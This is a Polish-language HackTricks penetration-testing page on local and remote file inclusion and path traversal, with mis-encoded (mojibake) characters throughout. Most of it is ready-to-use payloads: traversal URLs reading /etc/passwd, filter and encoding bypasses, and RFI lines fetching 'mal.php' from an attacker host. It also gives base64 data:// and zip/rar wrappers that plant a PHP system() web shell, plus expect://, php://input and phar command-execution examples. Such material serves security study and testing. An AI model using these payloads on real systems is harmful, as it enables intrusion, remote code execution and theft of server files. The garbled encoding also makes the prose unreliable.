# WÅ‚Ä…czenie pliku / Traversal Å›cieÅ¼ki

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**SpostrzeÅ¼enia dotyczÄ…ce hakerstwa**\
Zajmij siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hakerstwa

**AktualnoÅ›ci na Å¼ywo dotyczÄ…ce hakerstwa**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakerstwa dziÄ™ki aktualnoÅ›ciom i spostrzeÅ¼eniom na Å¼ywo

**Najnowsze ogÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i istotnymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

## WÅ‚Ä…czenie pliku

**Zdalne wÅ‚Ä…czenie pliku (RFI):** Plik jest Å‚adowany z zdalnego serwera (Najlepiej: MoÅ¼esz napisaÄ‡ kod, a serwer go wykonuje). W php jest to **wyÅ‚Ä…czone** domyÅ›lnie (**allow\_url\_include**).\
**Lokalne wÅ‚Ä…czenie pliku (LFI):** Serwer Å‚aduje lokalny plik.

PodatnoÅ›Ä‡ wystÄ™puje, gdy uÅ¼ytkownik w jakiÅ› sposÃ³b moÅ¼e kontrolowaÄ‡ plik, ktÃ³ry ma zostaÄ‡ zaÅ‚adowany przez serwer.

Podatne **funkcje PHP**: require, require\_once, include, include\_once

InteresujÄ…ce narzÄ™dzie do wykorzystania tej podatnoÅ›ci: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Åšlepe - InteresujÄ…ce - Pliki LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**MieszajÄ…c kilka list LFI dla systemÃ³w \*nix i dodajÄ…c wiÄ™cej Å›cieÅ¼ek, stworzyÅ‚em tÄ™ listÄ™:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

SprÃ³buj rÃ³wnieÅ¼ zamieniÄ‡ `/` na `\`\
SprÃ³buj rÃ³wnieÅ¼ dodaÄ‡ `../../../../../`

ListÄ™ wykorzystujÄ…cÄ… kilka technik do znalezienia pliku /etc/password (aby sprawdziÄ‡, czy istnieje podatnoÅ›Ä‡) moÅ¼na znaleÅºÄ‡ [tutaj](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

PoÅ‚Ä…czenie rÃ³Å¼nych list sÅ‚Ã³w:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

SprÃ³buj rÃ³wnieÅ¼ zamieniÄ‡ `/` na `\`\
SprÃ³buj rÃ³wnieÅ¼ usunÄ…Ä‡ `C:/` i dodaÄ‡ `../../../../../`

ListÄ™ wykorzystujÄ…cÄ… kilka technik do znalezienia pliku /boot.ini (aby sprawdziÄ‡, czy istnieje podatnoÅ›Ä‡) moÅ¼na znaleÅºÄ‡ [tutaj](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

SprawdÅº listÄ™ LFI dla systemu Linux.

## Podstawowe LFI i bypassy

Wszystkie przykÅ‚ady dotyczÄ… lokalnego wÅ‚Ä…czenia pliku, ale mogÄ… byÄ‡ rÃ³wnieÅ¼ stosowane do zdalnego wÅ‚Ä…czenia pliku (strona=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### sekwencje trawersowania pozbawione rekurencyjnie
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Bajt zerowy (%00)**

OminiÄ™cie dodawania dodatkowych znakÃ³w na koÅ„cu podanego ciÄ…gu znakÃ³w (ominiÄ™cie: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
To jest **rozwiÄ…zane od wersji PHP 5.4**

### **Kodowanie**

MoÅ¼esz uÅ¼yÄ‡ niestandardowych kodowaÅ„, takich jak podwÃ³jne kodowanie URL (i inne):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Z istniejÄ…cego folderu

ByÄ‡ moÅ¼e back-end sprawdza Å›cieÅ¼kÄ™ folderu:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Badanie katalogÃ³w systemu plikÃ³w na serwerze

System plikÃ³w serwera moÅ¼na badaÄ‡ rekurencyjnie, aby zidentyfikowaÄ‡ katalogi, a nie tylko pliki, stosujÄ…c okreÅ›lone techniki. Proces ten polega na okreÅ›leniu gÅ‚Ä™bokoÅ›ci katalogu i sprawdzaniu istnienia okreÅ›lonych folderÃ³w. PoniÅ¼ej znajduje siÄ™ szczegÃ³Å‚owa metoda osiÄ…gniÄ™cia tego:

1. **OkreÅ›lenie gÅ‚Ä™bokoÅ›ci katalogu:** OkreÅ›l gÅ‚Ä™bokoÅ›Ä‡ bieÅ¼Ä…cego katalogu, pobierajÄ…c pomyÅ›lnie plik `/etc/passwd` (dotyczy to serwera opartego na systemie Linux). PrzykÅ‚adowy adres URL moÅ¼e byÄ‡ zbudowany w nastÄ™pujÄ…cy sposÃ³b, wskazujÄ…c na gÅ‚Ä™bokoÅ›Ä‡ trzy:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Sondowanie folderÃ³w:** DoÅ‚Ä…cz nazwÄ™ podejrzanego folderu (np. `private`) do adresu URL, a nastÄ™pnie przejdÅº z powrotem do `/etc/passwd`. Dodatkowy poziom katalogu wymaga zwiÄ™kszenia gÅ‚Ä™bokoÅ›ci o jeden:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Zinterpretuj wyniki:** OdpowiedÅº serwera wskazuje, czy folder istnieje:
   * **BÅ‚Ä…d / Brak wyniku:** Folder `private` prawdopodobnie nie istnieje w okreÅ›lonej lokalizacji.
   * **ZawartoÅ›Ä‡ `/etc/passwd`:** Potwierdza obecnoÅ›Ä‡ folderu `private`.
4. **Rekursywne badanie:** Odkryte foldery moÅ¼na dodatkowo sprawdzaÄ‡ pod kÄ…tem podfolderÃ³w lub plikÃ³w, korzystajÄ…c z tej samej techniki lub tradycyjnych metod lokalnego wÅ‚Ä…czenia plikÃ³w (LFI).

Aby badaÄ‡ katalogi w rÃ³Å¼nych lokalizacjach w systemie plikÃ³w, dostosuj Å‚adunek odpowiednio. Na przykÅ‚ad, aby sprawdziÄ‡, czy `/var/www/` zawiera katalog `private` (zakÅ‚adajÄ…c, Å¼e bieÅ¼Ä…cy katalog znajduje siÄ™ na gÅ‚Ä™bokoÅ›ci 3), uÅ¼yj:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Technika skracania Å›cieÅ¼ki**

Skracanie Å›cieÅ¼ki to metoda stosowana do manipulowania Å›cieÅ¼kami plikÃ³w w aplikacjach internetowych. Jest czÄ™sto uÅ¼ywana do uzyskiwania dostÄ™pu do ograniczonych plikÃ³w poprzez obejÅ›cie pewnych Å›rodkÃ³w bezpieczeÅ„stwa, ktÃ³re dodajÄ… dodatkowe znaki na koÅ„cu Å›cieÅ¼ek plikÃ³w. Celem jest stworzenie Å›cieÅ¼ki pliku, ktÃ³ra po zmianie przez Å›rodek bezpieczeÅ„stwa nadal wskazuje na poÅ¼Ä…dany plik.

W PHP rÃ³Å¼ne reprezentacje Å›cieÅ¼ki pliku mogÄ… byÄ‡ uwaÅ¼ane za rÃ³wnowaÅ¼ne ze wzglÄ™du na charakter systemu plikÃ³w. Na przykÅ‚ad:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` i `/etc/passwd/` sÄ… traktowane jako ta sama Å›cieÅ¼ka.
* Gdy ostatnie 6 znakÃ³w to `passwd`, doÅ‚Ä…czenie `/` (tworzÄ…c `passwd/`) nie zmienia docelowego pliku.
* Podobnie, jeÅ›li do Å›cieÅ¼ki pliku dodano `.php` (np. `shellcode.php`), dodanie `/.` na koÅ„cu nie zmieni dostÄ™pu do pliku.

Przedstawione przykÅ‚ady pokazujÄ…, jak wykorzystaÄ‡ skracanie Å›cieÅ¼ki do uzyskania dostÄ™pu do `/etc/passwd`, powszechnego celu ze wzglÄ™du na swojÄ… wraÅ¼liwÄ… zawartoÅ›Ä‡ (informacje o kontach uÅ¼ytkownikÃ³w):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
W tych scenariuszach liczba potrzebnych przekÅ‚adni moÅ¼e wynosiÄ‡ okoÅ‚o 2027, ale ta liczba moÅ¼e siÄ™ rÃ³Å¼niÄ‡ w zaleÅ¼noÅ›ci od konfiguracji serwera.

* **UÅ¼ycie segmentÃ³w kropkowych i dodatkowych znakÃ³w**: Sekwencje przekÅ‚adni (`../`) poÅ‚Ä…czone z dodatkowymi segmentami kropkowymi i znakami mogÄ… byÄ‡ uÅ¼ywane do nawigacji po systemie plikÃ³w, efektywnie ignorujÄ…c doÅ‚Ä…czone ciÄ…gi przez serwer.
* **OkreÅ›lenie wymaganej liczby przekÅ‚adni**: Poprzez prÃ³bÄ™ i bÅ‚Ä…d moÅ¼na znaleÅºÄ‡ precyzyjnÄ… liczbÄ™ sekwencji `../` potrzebnÄ… do nawigacji do katalogu gÅ‚Ã³wnego, a nastÄ™pnie do `/etc/passwd`, zapewniajÄ…c, Å¼e wszelkie doÅ‚Ä…czone ciÄ…gi (np. `.php`) sÄ… zneutralizowane, ale Å¼Ä…dana Å›cieÅ¼ka (`/etc/passwd`) pozostaje nietkniÄ™ta.
* **RozpoczÄ™cie od faÅ‚szywego katalogu**: To powszechne praktyka rozpoczynania Å›cieÅ¼ki od nieistniejÄ…cego katalogu (np. `a/`). Ta technika jest stosowana jako Å›rodek ostroÅ¼noÅ›ci lub do speÅ‚nienia wymagaÅ„ logiki analizy Å›cieÅ¼ki serwera.

Podczas korzystania z technik skracania Å›cieÅ¼ki waÅ¼ne jest zrozumienie zachowania analizy Å›cieÅ¼ki serwera i struktury systemu plikÃ³w. KaÅ¼dy scenariusz moÅ¼e wymagaÄ‡ innego podejÅ›cia, a testowanie jest czÄ™sto konieczne, aby znaleÅºÄ‡ najbardziej skutecznÄ… metodÄ™.

**Ta podatnoÅ›Ä‡ zostaÅ‚a naprawiona w PHP 5.3.**

### **Sztuczki bypassowania filtrÃ³w**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Zdalne doÅ‚Ä…czenie pliku

W PHP jest to domyÅ›lnie wyÅ‚Ä…czone, poniewaÅ¼ **`allow_url_include`** jest ustawione na **Off.** Musi byÄ‡ ustawione na **On**, aby dziaÅ‚aÅ‚o, wtedy moÅ¼na doÅ‚Ä…czyÄ‡ plik PHP z serwera i uzyskaÄ‡ RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
JeÅ›li z jakiegoÅ› powodu **`allow_url_include`** jest **WÅ‚Ä…czone**, ale PHP **filtrowanie** dostÄ™pu do zewnÄ™trznych stron, [zgodnie z tym postem](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), moÅ¼na na przykÅ‚ad uÅ¼yÄ‡ protokoÅ‚u danych z base64 do odszyfrowania kodu PHP w formacie b64 i uzyskaÄ‡ RCE:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
W poprzednim kodzie koÅ„cÃ³wka `+.txt` zostaÅ‚a dodana, poniewaÅ¼ atakujÄ…cy potrzebowaÅ‚ ciÄ…gu znakÃ³w koÅ„czÄ…cego siÄ™ na `.txt`, wiÄ™c ciÄ…g koÅ„czy siÄ™ tym i po zdekodowaniu b64 ta czÄ™Å›Ä‡ zwrÃ³ci tylko Å›mieci, a prawdziwy kod PHP zostanie doÅ‚Ä…czony (a co za tym idzie, wykonany).
{% endhint %}

Kolejny przykÅ‚ad **bez uÅ¼ycia protokoÅ‚u `php://`** to:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Element gÅ‚Ã³wny Pythona

W Pythonie w kodzie takim jak ten:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
JeÅ›li uÅ¼ytkownik przekazuje **bezwzglÄ™dnÄ… Å›cieÅ¼kÄ™** do **`nazwa_pliku`**, to **poprzednia Å›cieÅ¼ka jest po prostu usuniÄ™ta**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
To jest zamierzone zachowanie zgodnie z [dokumentacjÄ…](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> JeÅ›li komponent jest Å›cieÅ¼kÄ… bezwzglÄ™dnÄ…, wszystkie poprzednie komponenty sÄ… odrzucane, a Å‚Ä…czenie kontynuowane jest od komponentu Å›cieÅ¼ki bezwzglÄ™dnej.

## Java Listowanie KatalogÃ³w

WyglÄ…da na to, Å¼e jeÅ›li masz Traversal Å›cieÅ¼ki w Javie i **poprosisz o katalog** zamiast pliku, **zostanie zwrÃ³cone listowanie katalogu**. W innych jÄ™zykach to siÄ™ nie zdarzy (o ile mi wiadomo).

## Top 25 parametrÃ³w

Oto lista 25 najwaÅ¼niejszych parametrÃ³w, ktÃ³re mogÄ… byÄ‡ podatne na lokalne wÅ‚Ä…czenie plikÃ³w (LFI) (z [linka](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI za pomocÄ… opakowaÅ„ i protokoÅ‚Ã³w PHP

### php://filter

Filtry PHP pozwalajÄ… na podstawowe operacje **modyfikacji danych** przed ich odczytem lub zapisem. Istnieje 5 kategorii filtrÃ³w:

* [Filtry Å‚aÅ„cuchÃ³w znakÃ³w](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Usuwa tagi z danych (wszystko pomiÄ™dzy znakami "<" i ">")
* NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e ten filtr zniknÄ…Å‚ z nowoczesnych wersji PHP
* [Filtry konwersji](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : PrzeksztaÅ‚ca do innego kodowania (`convert.iconv.<input_enc>.<output_enc>`). Aby uzyskaÄ‡ **listÄ™ wszystkich obsÅ‚ugiwanych kodowaÅ„**, uruchom w konsoli: `iconv -l`

{% hint style="warning" %}
WykorzystujÄ…c filtr konwersji `convert.iconv.*` moÅ¼na **generowaÄ‡ dowolny tekst**, co moÅ¼e byÄ‡ przydatne do zapisywania dowolnego tekstu lub tworzenia funkcji, takiej jak proces doÅ‚Ä…czania dowolnego tekstu. Aby uzyskaÄ‡ wiÄ™cej informacji, sprawdÅº [**LFI2RCE za pomocÄ… filtrÃ³w php**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filtry kompresji](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Kompresuje zawartoÅ›Ä‡ (przydatne przy eksfiltracji duÅ¼ej iloÅ›ci informacji)
* `zlib.inflate`: Dekompresuje dane
* [Filtry szyfrowania](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : PrzestarzaÅ‚e
* `mdecrypt.*` : PrzestarzaÅ‚e
* Inne filtry
* Uruchomienie w PHP `var_dump(stream_get_filters());` pozwala znaleÅºÄ‡ kilka **nieoczekiwanych filtrÃ³w**:
* `consumed`
* `dechunk`: odwraca kodowanie kawaÅ‚kowe HTTP
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,Â£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
CzÄ™Å›Ä‡ "php://filter" jest nieczuÅ‚a na wielkoÅ›Ä‡ liter
{% endhint %}

### Korzystanie z filtrÃ³w php jako orakulum do odczytywania dowolnych plikÃ³w

[**W tym poÅ›cie**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) proponowana jest technika odczytywania lokalnego pliku bez koniecznoÅ›ci otrzymywania odpowiedzi zwrotnej od serwera. Ta technika opiera siÄ™ na **eksfiltracji pliku (znak po znaku) za pomocÄ… filtrÃ³w php** jako orakulum. Jest to moÅ¼liwe, poniewaÅ¼ filtry php mogÄ… byÄ‡ uÅ¼ywane do zwiÄ™kszenia tekstu na tyle, aby php wygenerowaÅ‚ wyjÄ…tek.

W oryginalnym poÅ›cie znajdziesz szczegÃ³Å‚owe wyjaÅ›nienie techniki, ale tutaj jest szybkie podsumowanie:

* UÅ¼yj kodeka **`UCS-4LE`** aby pozostawiÄ‡ wiodÄ…cy znak tekstu na poczÄ…tku i sprawiÄ‡, Å¼e rozmiar ciÄ…gu zwiÄ™ksza siÄ™ wykÅ‚adniczo.
* BÄ™dzie to uÅ¼ywane do wygenerowania **tekstu na tyle duÅ¼ego, Å¼e gdy poczÄ…tkowa litera zostanie odgadniÄ™ta poprawnie**, php spowoduje **bÅ‚Ä…d**
* Filtr **dechunk** usunie **wszystko, jeÅ›li pierwszy znak nie jest szesnastkowy**, dziÄ™ki czemu moÅ¼emy dowiedzieÄ‡ siÄ™, czy pierwszy znak jest szesnastkowy.
* To, poÅ‚Ä…czone z poprzednim (i innymi filtrami w zaleÅ¼noÅ›ci od odgadniÄ™tej litery), pozwoli nam odgadnÄ…Ä‡ literÄ™ na poczÄ…tku tekstu, obserwujÄ…c, kiedy wykonamy wystarczajÄ…co duÅ¼o transformacji, aby przestaÅ‚a byÄ‡ to szesnastkowa litera. PoniewaÅ¼ jeÅ›li jest szesnastkowa, dechunk jej nie usunie, a poczÄ…tkowa bomba spowoduje bÅ‚Ä…d php.
* Kodek **convert.iconv.UNICODE.CP930** przeksztaÅ‚ca kaÅ¼dÄ… literÄ™ w kolejnÄ… (wiÄ™c po zastosowaniu tego kodera: a -> b). Pozwala to nam dowiedzieÄ‡ siÄ™, czy pierwsza litera to na przykÅ‚ad `a`, poniewaÅ¼ jeÅ›li zastosujemy 6 razy ten kod a->b->c->d->e->f->g litera przestaje byÄ‡ szesnastkowÄ… literÄ…, dlatego dechunk jej nie usunie, a bÅ‚Ä…d php zostanie wywoÅ‚any, poniewaÅ¼ mnoÅ¼y siÄ™ z poczÄ…tkowÄ… bombÄ….
* KorzystajÄ…c z innych transformacji, takich jak **rot13** na poczÄ…tku, moÅ¼liwe jest ujawnienie innych znakÃ³w, takich jak n, o, p, q, r (i inne kody mogÄ… byÄ‡ uÅ¼yte do przeniesienia innych liter do zakresu szesnastkowego).
* Gdy poczÄ…tkowy znak to liczba, konieczne jest zakodowanie jej w base64 i ujawnienie 2 pierwszych liter, aby ujawniÄ‡ liczbÄ™.
* Ostatecznym problemem jest zobaczenie, **jak ujawniÄ‡ wiÄ™cej niÅ¼ poczÄ…tkowÄ… literÄ™**. KorzystajÄ…c z filtrÃ³w pamiÄ™ci porzÄ…dkowej, takich jak **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE**, moÅ¼liwe jest zmienienie kolejnoÅ›ci znakÃ³w i uzyskanie w pierwszej pozycji innych liter tekstu.
* Aby mÃ³c uzyskaÄ‡ **dalsze dane**, pomysÅ‚em jest **generowanie 2 bajtÃ³w danych Å›mieciowych na poczÄ…tku** za pomocÄ… **convert.iconv.UTF16.UTF16**, zastosowanie **UCS-4LE** aby zrobiÄ‡ z nich **punkt z nastÄ™pnymi 2 bajtami**, i **usuniÄ™cie danych do danych Å›mieciowych** (to usunie 2 pierwsze bajty poczÄ…tkowego tekstu). Kontynuuj to aÅ¼ osiÄ…gniesz poÅ¼Ä…dany bit do ujawnienia.

W poÅ›cie zostaÅ‚o rÃ³wnieÅ¼ ujawnione narzÄ™dzie do automatycznego wykonania tego: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

Ten otok pozwala uzyskaÄ‡ dostÄ™p do deskryptorÃ³w plikÃ³w, ktÃ³re proces ma otwarte. Potencjalnie przydatne do eksfiltracji zawartoÅ›ci otwartych plikÃ³w:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ **php://stdin, php://stdout i php://stderr** do uzyskania dostÄ™pu odpowiednio do **deskryptorÃ³w plikÃ³w 0, 1 i 2** (nie jestem pewien, jak to moÅ¼e byÄ‡ przydatne w ataku)

### zip:// i rar://

PrzeÅ›lij plik Zip lub Rar z PHPShell w Å›rodku i uzyskaj do niego dostÄ™p.\
Aby mÃ³c naduÅ¼yÄ‡ protokoÅ‚u rar, **musi byÄ‡ on specjalnie aktywowany**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

Data URI (Uniform Resource Identifier) jest maÅ‚Ä… technikÄ…, ktÃ³ra pozwala osadzaÄ‡ dane bezpoÅ›rednio w adresie URL. MoÅ¼e to byÄ‡ wykorzystane do osadzania maÅ‚ych plikÃ³w, takich jak obrazy lub pliki CSS, bez koniecznoÅ›ci odwoÅ‚ywania siÄ™ do zewnÄ™trznych zasobÃ³w.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
ZauwaÅ¼, Å¼e ten protokÃ³Å‚ jest ograniczony przez konfiguracje php **`allow_url_open`** i **`allow_url_include`**

### expect://

Oczekiwanie musi byÄ‡ aktywowane. MoÅ¼esz wykonaÄ‡ kod, uÅ¼ywajÄ…c tego:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

OkreÅ›l swÃ³j Å‚adunek w parametrach POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Plik `.phar` moÅ¼e byÄ‡ wykorzystany do wykonania kodu PHP, gdy aplikacja internetowa wykorzystuje funkcje takie jak `include` do Å‚adowania plikÃ³w. PoniÅ¼szy fragment kodu PHP demonstruje tworzenie pliku `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Aby skompilowaÄ‡ plik `.phar`, naleÅ¼y wykonaÄ‡ nastÄ™pujÄ…ce polecenie:
```bash
php --define phar.readonly=0 create_path.php
```
Podczas wykonywania zostanie utworzony plik o nazwie `test.phar`, ktÃ³ry potencjalnie moÅ¼e byÄ‡ wykorzystany do wykorzystania podatnoÅ›ci na lokalne uwzglÄ™dnienie plikÃ³w (LFI).

W przypadkach, gdy LFI wykonuje tylko odczyt pliku bez wykonywania kodu PHP wewnÄ…trz, poprzez funkcje takie jak `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, lub `filesize()`, moÅ¼na prÃ³bowaÄ‡ wykorzystaÄ‡ podatnoÅ›Ä‡ deserializacji. Ta podatnoÅ›Ä‡ jest zwiÄ…zana z odczytem plikÃ³w za pomocÄ… protokoÅ‚u `phar`.

Dla szczegÃ³Å‚owego zrozumienia wykorzystywania podatnoÅ›ci deserializacji w kontekÅ›cie plikÃ³w `.phar`, zapoznaj siÄ™ z dokumentem podlinkowanym poniÅ¼ej:

[Przewodnik po eksploatacji deserializacji Phar](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### WiÄ™cej protokoÅ‚Ã³w

SprawdÅº wiÄ™cej moÅ¼liwych [**protokoÅ‚Ã³w do uwzglÄ™dnienia tutaj**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory i php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) â€” Zapis w pamiÄ™ci lub w pliku tymczasowym (nie jestem pewien, jak moÅ¼e to byÄ‡ przydatne w ataku na uwzglÄ™dnienie plikÃ³w)
* [file://](https://www.php.net/manual/en/wrappers.file.php) â€” DostÄ™p do lokalnego systemu plikÃ³w
* [http://](https://www.php.net/manual/en/wrappers.http.php) â€” DostÄ™p do adresÃ³w URL HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) â€” DostÄ™p do adresÃ³w URL FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) â€” Strumienie kompresji
